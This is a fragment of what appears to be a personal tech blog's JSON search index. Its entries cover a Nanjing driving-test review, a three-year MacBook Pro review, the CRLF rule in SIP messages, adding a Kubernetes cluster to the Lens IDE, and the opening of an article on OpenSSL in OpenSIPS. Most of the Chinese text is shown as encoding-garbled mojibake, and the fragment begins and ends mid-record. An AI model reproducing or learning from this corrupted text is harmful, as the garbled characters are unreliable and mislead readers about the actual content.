æ¨¡æ‹Ÿçš„è´¹ç”¨æ˜¯360ï¼ŒåŒ…å«ä¸€ä¸‹å†…å®¹\nå€’è½¦å…¥åº“120ï¼Œå¯ä»¥å€’åº“3æ¬¡ å››é¡¹æœ‰å…«æ¡çº¿è·¯ï¼Œæ¯ä¸ªçº¿è·¯å„è·‘ä¸€æ¬¡ å››é¡¹çš„è½¦å’Œå€’åº“çš„è½¦æ˜¯ä¸åŒçš„ï¼Œè¿™ç‚¹éœ€è¦æ³¨æ„ã€‚\næ¨¡æ‹Ÿè€ƒæœ‰ç”¨å—ï¼Ÿ æˆ‘è§‰çš„æ˜¯æœ‰ç”¨çš„\nä¸€èˆ¬é©¾æ ¡åªæœ‰ä¸€ä¸¤æ¡çº¿è·¯ï¼Œå®é™…è€ƒåœºæœ‰8æ¡çº¿è·¯ã€‚æ¯æ¡çº¿è·¯ä½ éƒ½å¯ä»¥è·‘ä¸€æ¬¡ï¼Œä»1å·çº¿åˆ°8å·çº¿ã€‚è·‘è¿‡è¿™8æ¡çº¿ï¼Œä½ ä¼šåŸºæœ¬çŸ¥é“è‡ªå·±å››é¡¹ä¸­å“ªäº›é¡¹ç›®æ¯”è¾ƒå®¹æ˜“å‡ºé”™ã€‚å¯ä»¥é’ˆå¯¹æ€§åŠ å¼ºã€‚å¦å¤–ä¹Ÿå¯ä»¥æ‰¾æ‰¾å¡é“çš„ç‚¹ä½ã€‚ è·‘æ¨¡æ‹Ÿå››é¡¹çš„æ—¶å€™ï¼Œæœ‰ä¸ªæ•™ç»ƒä¼šååœ¨å‰¯é©¾é©¶ä¸Šã€‚ä»–ä¼šä¸æ–­çš„å‚¬ä¿ƒä½ ï¼Œæ­¤æ—¶ä½ åƒä¸‡ä¸è¦è®©ä»–çš„å‚¬ä¿ƒå¯¼è‡´ä½ è¿ç»­çš„å‡ºé”™ï¼Œè¿›è€Œå½±å“åˆ°ä½ è€ƒè¯•çš„å¿ƒæ€ã€‚ä½ æ˜¯äº¤äº†é’±çš„ï¼Œç¦»åˆå’Œæ²¹é—¨éƒ½åœ¨ä½ è¿™è¾¹ï¼Œæ•™ç»ƒå†å‚¬ï¼Œä¹Ÿæ˜¯æ²¡åŠæ³•è®©è½¦åŠ é€Ÿçš„ã€‚ä½ ä¸è¦æ€‚ã€‚ã€æ³¨æ„ï¼šåœ¨çœŸå®è€ƒè¯•æ—¶ï¼Œå‰¯é©¾é©¶æ˜¯æ²¡æœ‰äººçš„ã€‚ã€‘ æ•™ç»ƒä¸ºä»€ä¹ˆè¦ä¸åœçš„å‚¬ä½ ï¼Œå› ä¸ºä½ è¶Šå¿«è·‘å®Œ8æ¡çº¿è·¯ï¼Œä»–å°±å¯ä»¥æ¥æ›´å¤šçš„å­¦å‘˜ï¼Œä»–æ‰‹é‡Œçš„å°ç¥¨å°±è¶Šå¤šï¼Œææˆå°±è¶Šå¤šã€‚å½“ä½ æ¨¡æ‹Ÿå®Œ8æ¡çº¿è·¯ï¼Œæ•™ç»ƒä¼šè®©ä½ å†ä¹°å‡ æ¡çº¿è·¯ã€‚çº¿è·¯å…¶å®æ˜¯å¯ä»¥æŒ‰æ¡ä¹°çš„ï¼Œæ¯æ¡çº¿è·‘ä¸€æ¬¡30å—ã€‚çœŸæ˜¯è½¦è½®ä¸€è½¬ï¼Œå®¶è´¢ä¸‡è´¯ã€‚è½¦è½®ä¸€å“ï¼Œé»„é‡‘ä¸‡ä¸¤å•Šã€‚ è™½ç„¶å€’åº“çš„è½¦åº“æœ‰14ä¸ªï¼Œä½†æ˜¯ä½ æ¨¡æ‹Ÿçš„é‚£ä¸ªè½¦åº“ï¼Œå…¶å®æœ‰æå¤§çš„å¯èƒ½å°±æ˜¯ä½ çœŸå®è€ƒè¯•çš„é‚£ä¸ªè½¦åº“ã€‚è¿™æ ·ä½ å°±å¯ä»¥æå‰ç†Ÿæ‚‰ä¸€ä¸‹è½¦åº“çš„ç‚¹ä½ã€‚æˆ‘æ¯”è¾ƒèœï¼Œæ¨¡æ‹Ÿä¸‰æ¬¡çš„å€’åº“éƒ½å€’å¤±è´¥äº†ã€‚ä½†æ˜¯æˆ‘ä»ä¸‰æ¬¡å¤±è´¥ä¸­ä¹Ÿå­¦åˆ°äº†è‡ªå·±å¤±è´¥çš„åŸå› ã€‚ä»è€Œåœ¨çœŸå®è€ƒè¯•æ—¶æˆåŠŸé€šè¿‡ã€‚å€’åº“å¦‚æœä½ ä¸‰æ¬¡éƒ½å¤±è´¥äº†ï¼Œä¹Ÿå¯ä»¥å•ç‹¬ä¹°çš„ã€‚å€’3æ¬¡60å—ã€‚å€’6æ¬¡120å—ã€‚ä½†æ˜¯è¿™å°±ä¸å»ºè®®å†èŠ±é’±äº†ã€‚ä½ åº”è¯¥è®°ä½è‡ªå·±çš„é”™è¯¯çš„ç‚¹ã€‚æ¯”å¦‚æ˜¯é‚£è¾¹å‹çº¿äº†ï¼Œç„¶åå›åˆ°é©¾æ ¡ï¼Œå’Œä½ çš„æ•™ç»ƒæ²Ÿé€šä¸€ä¸‹ã€‚é©¾æ ¡çš„æ•™ç»ƒä¼šç»™ä½ æ›´åŠ æœ‰ç”¨çš„å»ºè®®ã€‚å¦å¤–ä½ åŠ¡å¿…è¦è®°ä½è‡ªå·±æ˜¯å‡ å·åº“ï¼Œä½ åªè¦å’Œé©¾æ ¡æ•™ç»ƒæ²Ÿé€šä¸€ä¸‹ï¼Œä»–éƒ½çŸ¥é“è¿™ä¸ªåº“ä½çš„å¤„ç†ç»†èŠ‚çš„ã€‚ å¦‚æœæˆ‘æ²¡æœ‰æ¨¡æ‹Ÿè€ƒè¿‡ï¼Œå¾ˆå¯èƒ½æˆ‘ç§‘ç›®äºŒç¬¬ä¸€æ¬¡ä¼šæŒ‚ï¼Œç„¶åè¿˜è¦èŠ±æ—¶é—´å»æè¿™ä»¶äº‹ã€‚å¦‚æœèƒ½ç”¨é’±è§£å†³çš„äº‹æƒ…ï¼Œæˆ‘æ›´å¸Œæœ›èƒ½èŠ‚çœä¸€äº›æ—¶é—´ã€‚ å¿ƒæ€ è€ƒè¯•çš„å¿ƒæ€å¾ˆé‡è¦ï¼Œå’Œæˆ‘ä¸€èµ·å‚è§è€ƒè¯•çš„ä¸€ä¸ªåŒå­¦ã€‚ä»–æ²¡æœ‰å‚åŠ æ¨¡æ‹Ÿè€ƒï¼Œä½†æ˜¯ä»–åœ¨è€ƒè¯•ä¸­å€’åº“ä¸€æŠŠå°±å€’è¿›å»äº†ã€‚æˆ‘è®¤ä¸ºä»–æ˜¯æ¯”è¾ƒç‰›é€¼çš„ã€‚ä½†æ˜¯æœ‰å¯èƒ½ä»–éª„å‚²äº†ï¼ŒæŒ‚åœ¨äº†å‡ ä¸ªè½¬å‘ç¯å’Œå¡é“å®šç‚¹ä¸Šã€‚ä¾§æ–¹åœè½¦æ—¶ï¼Œå‡ºåº“å±…ç„¶å¿˜è®°æ‰“è½¬å‘ç¯äº†ã€‚\nä¹Ÿæœ‰äººå¿˜è®°ç³»å®‰å…¨å¸¦äº†ã€‚\nå¾ˆå¤šå°çš„ç‚¹ï¼Œä¹Ÿå¾ˆå®¹æ˜“çš„ç‚¹ã€‚åœ¨é©¾æ ¡éƒ½ç»ƒçš„å¾ˆç†Ÿç»ƒï¼Œä½†æ˜¯ä¸€åˆ°è€ƒåœºï¼Œå°±æ€»æ˜¯ä¸¢ä¸‰è½å››çš„å¿˜è®°ã€‚ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ç§åœºæ™¯çš„ã€‚\nå› ä¸ºå¿ƒæ€å˜äº†ã€‚\n","permalink":"https://wdd.js.org/posts/2021/01/","summary":"ç§‘ç›®äºŒå€’åº“å’Œå››é¡¹ç»ƒçš„å·®ä¸å¤šäº†ï¼Œå†³å®šå»å‚åŠ è€ƒè¯•ï¼Œè€ƒè¯•è™½ç„¶ä¸€æ³¢ä¸‰æŠ˜ï¼Œä½†ç»“æœè¿˜æ˜¯å¥½çš„ï¼Œä¸€æ¬¡é€šè¿‡äº†\nè€ƒåœºç†Ÿæ‚‰ è€ƒåœºå€’åº“æœ‰14å„åŒºï¼Œæ²¡ä»€ä¹ˆå¥½è®²çš„ã€‚ å››é¡¹æœ‰4å„ç¯çº¿ï¼Œæ¯ä¸ªç¯çº¿ä¸Šæœ‰ä¸¤ä¸ªè€ƒè¯•çº¿è·¯ï¼Œæ‰€ä»¥ä¸€å…±æ˜¯8æ¡çº¿è·¯ åŠ¡å¿…çœ‹æ‡‚å„ç§ç¬¦å·çš„å«ä¹‰ï¼Œä¾‹å¦‚æ›²çº¿ï¼Œä¾§æ–¹ï¼Œ ç›´è§’ä¸å¡é“ ã€é‡ç‚¹ã€‘å½“ä½ çŸ¥é“ä½ è‡ªå·±åœ¨é‚£æ¡çº¿ä¸Šè€ƒè¯•ä¹‹åï¼ŒåŠ¡å¿…å¯¹ç…§ç€çº¿è·¯å›¾ï¼Œå°†å››é¡¹çš„é¡ºåºä»¥åŠä½ç½®ç‰¢è®°äºå¿ƒã€‚è™½ç„¶è·¯ä¸Šä¼šæœ‰ç‰Œå­æŒ‡ç¤ºä¸‹ä¸€é¡¹å†…å®¹æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯è€ƒè¯•çš„æ—¶å€™ï¼Œç”±äºè§†çº¿ç­‰å„ç§åŸå› å¯èƒ½ä¸ä¼šå»åœ¨æ„ã€‚ä¹Ÿæœ‰äººï¼Œçœ‹åˆ°å‰é¢æ˜¯ç›´è§’ï¼Œå°±ä»¥ä¸ºæ˜¯å‰é¢æ˜¯ç›´è§’è½¬å¼¯ï¼Œç»“æœåˆ°äº†çœŸæ­£ç›´è§’è½¬å¼¯çš„ä½ç½®ï¼Œå´æ²¡æœ‰åšç›´è§’ç›¸å…³çš„æ“ä½œï¼Œå¯¼è‡´è€ƒè¯•å¤±è´¥ã€‚ ä¾‹å¦‚ï¼Œå½“ä½ è¢«é€‰æ‹©åˆ°8å·çº¿çš„å››é¡¹æ—¶ï¼Œä½ åˆ°äº†7-8å¾…è€ƒç­‰å¾…åŒºåï¼Œç­‰å¾…è‡ªå·±çš„è€ƒè¯•è½¦ã€‚åœ¨ç­‰å¾…è¿‡ç¨‹ä¸­æŒ‰ç…§å¹³é¢å›¾ï¼Œå¯ä»¥å‘ç°ï¼Œç¦»å¾…è€ƒæœ€è¿‘çš„èµ·ç‚¹ä¹‹åï¼Œ8å·çº¿ï¼Œç¬¬ä¸€ä¸ªè€ƒè¯•é¡¹ç›®ä¾§æ–¹åœè½¦ï¼Œç„¶åæ˜¯ç›´è§’è½¬å¼¯ï¼Œæ¥ç€æ˜¯Så¼¯ï¼Œæœ€åæ˜¯å¡é“ã€‚\næ¨¡æ‹Ÿè€ƒç›¸å…³ æ¨¡æ‹Ÿçš„è´¹ç”¨ä»¥åŠé¡¹ç›®å†…å®¹ æ¨¡æ‹Ÿçš„è´¹ç”¨æ˜¯360ï¼ŒåŒ…å«ä¸€ä¸‹å†…å®¹\nå€’è½¦å…¥åº“120ï¼Œå¯ä»¥å€’åº“3æ¬¡ å››é¡¹æœ‰å…«æ¡çº¿è·¯ï¼Œæ¯ä¸ªçº¿è·¯å„è·‘ä¸€æ¬¡ å››é¡¹çš„è½¦å’Œå€’åº“çš„è½¦æ˜¯ä¸åŒçš„ï¼Œè¿™ç‚¹éœ€è¦æ³¨æ„ã€‚\næ¨¡æ‹Ÿè€ƒæœ‰ç”¨å—ï¼Ÿ æˆ‘è§‰çš„æ˜¯æœ‰ç”¨çš„\nä¸€èˆ¬é©¾æ ¡åªæœ‰ä¸€ä¸¤æ¡çº¿è·¯ï¼Œå®é™…è€ƒåœºæœ‰8æ¡çº¿è·¯ã€‚æ¯æ¡çº¿è·¯ä½ éƒ½å¯ä»¥è·‘ä¸€æ¬¡ï¼Œä»1å·çº¿åˆ°8å·çº¿ã€‚è·‘è¿‡è¿™8æ¡çº¿ï¼Œä½ ä¼šåŸºæœ¬çŸ¥é“è‡ªå·±å››é¡¹ä¸­å“ªäº›é¡¹ç›®æ¯”è¾ƒå®¹æ˜“å‡ºé”™ã€‚å¯ä»¥é’ˆå¯¹æ€§åŠ å¼ºã€‚å¦å¤–ä¹Ÿå¯ä»¥æ‰¾æ‰¾å¡é“çš„ç‚¹ä½ã€‚ è·‘æ¨¡æ‹Ÿå››é¡¹çš„æ—¶å€™ï¼Œæœ‰ä¸ªæ•™ç»ƒä¼šååœ¨å‰¯é©¾é©¶ä¸Šã€‚ä»–ä¼šä¸æ–­çš„å‚¬ä¿ƒä½ ï¼Œæ­¤æ—¶ä½ åƒä¸‡ä¸è¦è®©ä»–çš„å‚¬ä¿ƒå¯¼è‡´ä½ è¿ç»­çš„å‡ºé”™ï¼Œè¿›è€Œå½±å“åˆ°ä½ è€ƒè¯•çš„å¿ƒæ€ã€‚ä½ æ˜¯äº¤äº†é’±çš„ï¼Œç¦»åˆå’Œæ²¹é—¨éƒ½åœ¨ä½ è¿™è¾¹ï¼Œæ•™ç»ƒå†å‚¬ï¼Œä¹Ÿæ˜¯æ²¡åŠæ³•è®©è½¦åŠ é€Ÿçš„ã€‚ä½ ä¸è¦æ€‚ã€‚ã€æ³¨æ„ï¼šåœ¨çœŸå®è€ƒè¯•æ—¶ï¼Œå‰¯é©¾é©¶æ˜¯æ²¡æœ‰äººçš„ã€‚ã€‘ æ•™ç»ƒä¸ºä»€ä¹ˆè¦ä¸åœçš„å‚¬ä½ ï¼Œå› ä¸ºä½ è¶Šå¿«è·‘å®Œ8æ¡çº¿è·¯ï¼Œä»–å°±å¯ä»¥æ¥æ›´å¤šçš„å­¦å‘˜ï¼Œä»–æ‰‹é‡Œçš„å°ç¥¨å°±è¶Šå¤šï¼Œææˆå°±è¶Šå¤šã€‚å½“ä½ æ¨¡æ‹Ÿå®Œ8æ¡çº¿è·¯ï¼Œæ•™ç»ƒä¼šè®©ä½ å†ä¹°å‡ æ¡çº¿è·¯ã€‚çº¿è·¯å…¶å®æ˜¯å¯ä»¥æŒ‰æ¡ä¹°çš„ï¼Œæ¯æ¡çº¿è·‘ä¸€æ¬¡30å—ã€‚çœŸæ˜¯è½¦è½®ä¸€è½¬ï¼Œå®¶è´¢ä¸‡è´¯ã€‚è½¦è½®ä¸€å“ï¼Œé»„é‡‘ä¸‡ä¸¤å•Šã€‚ è™½ç„¶å€’åº“çš„è½¦åº“æœ‰14ä¸ªï¼Œä½†æ˜¯ä½ æ¨¡æ‹Ÿçš„é‚£ä¸ªè½¦åº“ï¼Œå…¶å®æœ‰æå¤§çš„å¯èƒ½å°±æ˜¯ä½ çœŸå®è€ƒè¯•çš„é‚£ä¸ªè½¦åº“ã€‚è¿™æ ·ä½ å°±å¯ä»¥æå‰ç†Ÿæ‚‰ä¸€ä¸‹è½¦åº“çš„ç‚¹ä½ã€‚æˆ‘æ¯”è¾ƒèœï¼Œæ¨¡æ‹Ÿä¸‰æ¬¡çš„å€’åº“éƒ½å€’å¤±è´¥äº†ã€‚ä½†æ˜¯æˆ‘ä»ä¸‰æ¬¡å¤±è´¥ä¸­ä¹Ÿå­¦åˆ°äº†è‡ªå·±å¤±è´¥çš„åŸå› ã€‚ä»è€Œåœ¨çœŸå®è€ƒè¯•æ—¶æˆåŠŸé€šè¿‡ã€‚å€’åº“å¦‚æœä½ ä¸‰æ¬¡éƒ½å¤±è´¥äº†ï¼Œä¹Ÿå¯ä»¥å•ç‹¬ä¹°çš„ã€‚å€’3æ¬¡60å—ã€‚å€’6æ¬¡120å—ã€‚ä½†æ˜¯è¿™å°±ä¸å»ºè®®å†èŠ±é’±äº†ã€‚ä½ åº”è¯¥è®°ä½è‡ªå·±çš„é”™è¯¯çš„ç‚¹ã€‚æ¯”å¦‚æ˜¯é‚£è¾¹å‹çº¿äº†ï¼Œç„¶åå›åˆ°é©¾æ ¡ï¼Œå’Œä½ çš„æ•™ç»ƒæ²Ÿé€šä¸€ä¸‹ã€‚é©¾æ ¡çš„æ•™ç»ƒä¼šç»™ä½ æ›´åŠ æœ‰ç”¨çš„å»ºè®®ã€‚å¦å¤–ä½ åŠ¡å¿…è¦è®°ä½è‡ªå·±æ˜¯å‡ å·åº“ï¼Œä½ åªè¦å’Œé©¾æ ¡æ•™ç»ƒæ²Ÿé€šä¸€ä¸‹ï¼Œä»–éƒ½çŸ¥é“è¿™ä¸ªåº“ä½çš„å¤„ç†ç»†èŠ‚çš„ã€‚ å¦‚æœæˆ‘æ²¡æœ‰æ¨¡æ‹Ÿè€ƒè¿‡ï¼Œå¾ˆå¯èƒ½æˆ‘ç§‘ç›®äºŒç¬¬ä¸€æ¬¡ä¼šæŒ‚ï¼Œç„¶åè¿˜è¦èŠ±æ—¶é—´å»æè¿™ä»¶äº‹ã€‚å¦‚æœèƒ½ç”¨é’±è§£å†³çš„äº‹æƒ…ï¼Œæˆ‘æ›´å¸Œæœ›èƒ½èŠ‚çœä¸€äº›æ—¶é—´ã€‚ å¿ƒæ€ è€ƒè¯•çš„å¿ƒæ€å¾ˆé‡è¦ï¼Œå’Œæˆ‘ä¸€èµ·å‚è§è€ƒè¯•çš„ä¸€ä¸ªåŒå­¦ã€‚ä»–æ²¡æœ‰å‚åŠ æ¨¡æ‹Ÿè€ƒï¼Œä½†æ˜¯ä»–åœ¨è€ƒè¯•ä¸­å€’åº“ä¸€æŠŠå°±å€’è¿›å»äº†ã€‚æˆ‘è®¤ä¸ºä»–æ˜¯æ¯”è¾ƒç‰›é€¼çš„ã€‚ä½†æ˜¯æœ‰å¯èƒ½ä»–éª„å‚²äº†ï¼ŒæŒ‚åœ¨äº†å‡ ä¸ªè½¬å‘ç¯å’Œå¡é“å®šç‚¹ä¸Šã€‚ä¾§æ–¹åœè½¦æ—¶ï¼Œå‡ºåº“å±…ç„¶å¿˜è®°æ‰“è½¬å‘ç¯äº†ã€‚\nä¹Ÿæœ‰äººå¿˜è®°ç³»å®‰å…¨å¸¦äº†ã€‚\nå¾ˆå¤šå°çš„ç‚¹ï¼Œä¹Ÿå¾ˆå®¹æ˜“çš„ç‚¹ã€‚åœ¨é©¾æ ¡éƒ½ç»ƒçš„å¾ˆç†Ÿç»ƒï¼Œä½†æ˜¯ä¸€åˆ°è€ƒåœºï¼Œå°±æ€»æ˜¯ä¸¢ä¸‰è½å››çš„å¿˜è®°ã€‚ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ç§åœºæ™¯çš„ã€‚\nå› ä¸ºå¿ƒæ€å˜äº†ã€‚","title":"å—äº¬å°§æ–°ç§‘ç›®äºŒè€ƒè¯•è€ƒè¯•å›é¡¾"},{"content":"æˆ‘çš„macbookæ˜¯2017ä¹°çš„, ä½¿ç”¨åˆ°ä»Šå¤©å¤§æ¦‚1204å¤©ã€‚\næœ€åˆçš„ä½¿ç”¨ä½“éªŒæ˜¯\nè§¦æ‘¸æ¿å¾ˆçµæ• å±å¹•å¾ˆé«˜æ¸… ç³»ç»Ÿå¾ˆæµç•… ä¸‰å¹´ä¸­å‡ºç°è¿‡çš„é—®é¢˜\né”®ç›˜ä¸­çš„å‡ ä¸ªæŒ‰é”®å‡ºç°è¿‡é—®é¢˜ï¼ŒæŒ‰é”®ä¸çµæ•ã€‚17å¹´æ˜¯ç”¨çš„è´è¶é”®ç›˜ï¼Œè¿™ä¸ªé”®ç›˜é—®é¢˜å¾ˆå¤šã€‚æœ€æ–°ç‰ˆå·²ç»æ¢æˆäº†å‰ªåˆ€è„šé”®ç›˜äº†ã€‚ å±å¹•è€åŒ–ï¼Œå±å¹•çš„å››å‘¨å‡ºç°æ·¡çº¢è‰²çš„çº¢æ™•ï¼Œä½†æ˜¯ä¸å½±å“ä½¿ç”¨ã€‚ å¦‚æœä¸å……ç”µçš„æƒ…å†µä¸‹ï¼Œæ‰ç”µè›®å¿«çš„ï¼Œè€Œä¸”æœ‰æ—¶å€™ç”µé‡è¿˜å¾ˆå¤šï¼Œå°±è‡ªåŠ¨å…³æœºã€‚ ç°åœ¨çš„æ„Ÿè§‰ï¼š\nè§¦æ‘¸æ¿æˆ‘åŸºæœ¬ä¸ä¼šç”¨äº†ï¼Œå› ä¸ºå¤§éƒ¨åˆ†æ—¶é—´æˆ‘éƒ½æ˜¯ç”¨é”®ç›˜å¯ä»¥æå®šä¸€åˆ‡ã€‚å› ä¸ºæˆ‘ç”¨äº†vimç¼–è¾‘å™¨ã€‚ æˆ‘ä¹Ÿä¸å†ä½¿ç”¨macbook proè‡ªå¸¦çš„é”®ç›˜ï¼Œå› ä¸ºçœŸæ˜¯ä¸å¥½ç”¨ã€‚æ‰€æœ‰çš„ç¬”è®°æœ¬é”®ç›˜ï¼Œé™¤äº†thinkpadçš„é”®ç›˜ã€‚éƒ½ä¸å¤ªå¥½ç”¨ï¼Œä¸é€‚åˆé•¿æ—¶é—´æ‰“å­—ã€‚æ‰€ä»¥æˆ‘ç”¨äº†å¤–æ¥çš„é™ç”µå®¹é”®ç›˜ã€‚ æ— è®ºå¤šä¹ˆå¥½çš„è‡ªå¸¦é”®ç›˜ï¼Œéƒ½æ¯”ä¸è¿‡å¤–æ¥çš„é”®ç›˜ï¼Œæ¯•ç«Ÿæ˜¯ä¸“ä¸šçš„ã€‚å½“ç„¶é™¤éä½ ç»å¸¸åˆæŸ¥æˆ–è€…ç§»åŠ¨ï¼Œå¤–æ¥é”®ç›˜çœŸæ˜¯éå¸¸å€¼å¾—å…¥æ‰‹ã€‚ å…³äºä¸‹ä¸€å°ç”µè„‘ï¼šä¸‹ä¸€å°ç”µè„‘æˆ‘ä¼šç­‰å¾…M2èŠ¯ç‰‡, macbook proæˆ–åˆ™æ˜¯macbook miniï¼Œ è¿™ä¸ªæˆ‘è¿˜æ²¡æƒ³å¥½ã€‚æˆ‘å¯¹å‘½ä»¤è¡Œä»¥åŠç›¸å…³unixæœ‰ç€å¾ˆå¤§çš„ä¾èµ–ã€‚å³ä½¿ç”¨ubuntu, æˆ‘ä¹Ÿä¸å¯èƒ½å†ä½¿ç”¨windowsã€‚\n","permalink":"https://wdd.js.org/posts/2020/12/kxpswu/","summary":"æˆ‘çš„macbookæ˜¯2017ä¹°çš„, ä½¿ç”¨åˆ°ä»Šå¤©å¤§æ¦‚1204å¤©ã€‚\næœ€åˆçš„ä½¿ç”¨ä½“éªŒæ˜¯\nè§¦æ‘¸æ¿å¾ˆçµæ• å±å¹•å¾ˆé«˜æ¸… ç³»ç»Ÿå¾ˆæµç•… ä¸‰å¹´ä¸­å‡ºç°è¿‡çš„é—®é¢˜\né”®ç›˜ä¸­çš„å‡ ä¸ªæŒ‰é”®å‡ºç°è¿‡é—®é¢˜ï¼ŒæŒ‰é”®ä¸çµæ•ã€‚17å¹´æ˜¯ç”¨çš„è´è¶é”®ç›˜ï¼Œè¿™ä¸ªé”®ç›˜é—®é¢˜å¾ˆå¤šã€‚æœ€æ–°ç‰ˆå·²ç»æ¢æˆäº†å‰ªåˆ€è„šé”®ç›˜äº†ã€‚ å±å¹•è€åŒ–ï¼Œå±å¹•çš„å››å‘¨å‡ºç°æ·¡çº¢è‰²çš„çº¢æ™•ï¼Œä½†æ˜¯ä¸å½±å“ä½¿ç”¨ã€‚ å¦‚æœä¸å……ç”µçš„æƒ…å†µä¸‹ï¼Œæ‰ç”µè›®å¿«çš„ï¼Œè€Œä¸”æœ‰æ—¶å€™ç”µé‡è¿˜å¾ˆå¤šï¼Œå°±è‡ªåŠ¨å…³æœºã€‚ ç°åœ¨çš„æ„Ÿè§‰ï¼š\nè§¦æ‘¸æ¿æˆ‘åŸºæœ¬ä¸ä¼šç”¨äº†ï¼Œå› ä¸ºå¤§éƒ¨åˆ†æ—¶é—´æˆ‘éƒ½æ˜¯ç”¨é”®ç›˜å¯ä»¥æå®šä¸€åˆ‡ã€‚å› ä¸ºæˆ‘ç”¨äº†vimç¼–è¾‘å™¨ã€‚ æˆ‘ä¹Ÿä¸å†ä½¿ç”¨macbook proè‡ªå¸¦çš„é”®ç›˜ï¼Œå› ä¸ºçœŸæ˜¯ä¸å¥½ç”¨ã€‚æ‰€æœ‰çš„ç¬”è®°æœ¬é”®ç›˜ï¼Œé™¤äº†thinkpadçš„é”®ç›˜ã€‚éƒ½ä¸å¤ªå¥½ç”¨ï¼Œä¸é€‚åˆé•¿æ—¶é—´æ‰“å­—ã€‚æ‰€ä»¥æˆ‘ç”¨äº†å¤–æ¥çš„é™ç”µå®¹é”®ç›˜ã€‚ æ— è®ºå¤šä¹ˆå¥½çš„è‡ªå¸¦é”®ç›˜ï¼Œéƒ½æ¯”ä¸è¿‡å¤–æ¥çš„é”®ç›˜ï¼Œæ¯•ç«Ÿæ˜¯ä¸“ä¸šçš„ã€‚å½“ç„¶é™¤éä½ ç»å¸¸åˆæŸ¥æˆ–è€…ç§»åŠ¨ï¼Œå¤–æ¥é”®ç›˜çœŸæ˜¯éå¸¸å€¼å¾—å…¥æ‰‹ã€‚ å…³äºä¸‹ä¸€å°ç”µè„‘ï¼šä¸‹ä¸€å°ç”µè„‘æˆ‘ä¼šç­‰å¾…M2èŠ¯ç‰‡, macbook proæˆ–åˆ™æ˜¯macbook miniï¼Œ è¿™ä¸ªæˆ‘è¿˜æ²¡æƒ³å¥½ã€‚æˆ‘å¯¹å‘½ä»¤è¡Œä»¥åŠç›¸å…³unixæœ‰ç€å¾ˆå¤§çš„ä¾èµ–ã€‚å³ä½¿ç”¨ubuntu, æˆ‘ä¹Ÿä¸å¯èƒ½å†ä½¿ç”¨windowsã€‚","title":"macbook pro ä½¿ç”¨ä¸‰å¹´åçš„æ„Ÿå—"},{"content":" generic-message = start-line *message-header CRLF [ message-body ] start-line = Request-Line / Status-Line å…¶ä¸­åœ¨rfc2543ä¸­è§„å®š\nCR = %d13 ; US-ASCII CR, carriage return character LF = %d10 ; US-ASCII LF, line feed character é¡¹ç›® åè¿›åˆ¶ å­—ç¬¦ä¸²è¡¨ç¤º CR 13 \\r LF 10 \\n ä¹Ÿå°±æ˜¯è¯´åœ¨ä¸€ä¸ªSIPæ¶ˆæ¯ä¸­\nheadline\\r\\n key:v\\r\\n \\r\\n some_body\\r\\n æ‰€ä»¥CRLFå°±æ˜¯ \\r\\nÂ å‚è€ƒ https://tools.ietf.org/html/rfc3261 https://tools.ietf.org/html/rfc2543 ","permalink":"https://wdd.js.org/opensips/ch3/sip-crlf/","summary":" generic-message = start-line *message-header CRLF [ message-body ] start-line = Request-Line / Status-Line å…¶ä¸­åœ¨rfc2543ä¸­è§„å®š\nCR = %d13 ; US-ASCII CR, carriage return character LF = %d10 ; US-ASCII LF, line feed character é¡¹ç›® åè¿›åˆ¶ å­—ç¬¦ä¸²è¡¨ç¤º CR 13 \\r LF 10 \\n ä¹Ÿå°±æ˜¯è¯´åœ¨ä¸€ä¸ªSIPæ¶ˆæ¯ä¸­\nheadline\\r\\n key:v\\r\\n \\r\\n some_body\\r\\n æ‰€ä»¥CRLFå°±æ˜¯ \\r\\nÂ å‚è€ƒ https://tools.ietf.org/html/rfc3261 https://tools.ietf.org/html/rfc2543 ","title":"SIPæ¶ˆæ¯æ ¼å¼CRLF"},{"content":"ä¸‹è½½å®‰è£… Lens-4.0.4.dmg\næ·»åŠ é›†ç¾¤ åœ¨k8s master èŠ‚ç‚¹ä¸Šä½¿ç”¨è¾“å…¥ä¸‹é¢çš„æŒ‡ä»¤ï¼Œ** å°†è¾“å‡ºå†…å®¹å¤åˆ¶ä¸€ä¸‹**\nkubectl config view --minify --raw é€‰æ‹©Fiel \u0026gt; Add cluster ç²˜è´´ é›†ç¾¤å°±æ˜¾ç¤ºå‡ºæ¥äº† ","permalink":"https://wdd.js.org/posts/2020/12/ai1lnu/","summary":"ä¸‹è½½å®‰è£… Lens-4.0.4.dmg\næ·»åŠ é›†ç¾¤ åœ¨k8s master èŠ‚ç‚¹ä¸Šä½¿ç”¨è¾“å…¥ä¸‹é¢çš„æŒ‡ä»¤ï¼Œ** å°†è¾“å‡ºå†…å®¹å¤åˆ¶ä¸€ä¸‹**\nkubectl config view --minify --raw é€‰æ‹©Fiel \u0026gt; Add cluster ç²˜è´´ é›†ç¾¤å°±æ˜¾ç¤ºå‡ºæ¥äº† ","title":"lens k8s IDE"},{"content":" In order to provide secure SIP communication over TLS connections, OpenSIPS uses the OpenSSL library, probably the most widely used open-source TLS \u0026amp; SSL library across the Internet. The fact that it is so popular and largely used makes it more robust, therefore a great choice to enforce security in a system! That was the reason it was chosen to be used in OpenSIPS in the first place. However, being designed as a multi-threaded library, while OpenSIPS is a multi-process application, integrating it was not an easy task. Furthermore, maintaining it was not trivial either. And the major changes in the OpenSSL library within the last couple of years have proven that. Once the library maintainers decided to have a more robust thread-safe approach, things started to break in OpenSIPS. Hence the numerous issues reported withing the last couple of years related to SSL bugs and crashes. The purpose of this post is to present you the challenges we faced, and how we dealt with them. This article describes the way OpenSSL, a multi-threaded designed library, was designed to work in OpenSIPS, a multi-process application, and what was the journey of maintaining the code by adapting to the changes throughout the years in the OpenSSL library.\nOpenSSLæ˜¯ä¸ªå¤šçº¿ç¨‹çš„ç¨‹åºï¼Œ OpenSIPSæ˜¯ä¸ªå¤šè¿›ç¨‹çš„ç¨‹åºï¼Œä¸¤è€…æ²Ÿé€šæ¯”è¾ƒéš¾ OpenSSLçš„å¤§ç‰ˆæœ¬å‡çº§ï¼Œæœ‰å¾ˆå¤§çš„å¯èƒ½æ€§å¯¼è‡´OpenSIPSä¹Ÿå‡ºé—®é¢˜ åœ¨githubä¸Šæœ‰å¾ˆå¤šçš„issueéƒ½æ˜¯å…³äºOpenSSLå’ŒOpenSIPS [BUG] Deadlock in libssl/libcrypto #1767 https://github.com/OpenSIPS/opensips/issues/1858 Original design The initial design and implementation of TLS support in OpenSIPS was done in 2003. Back then 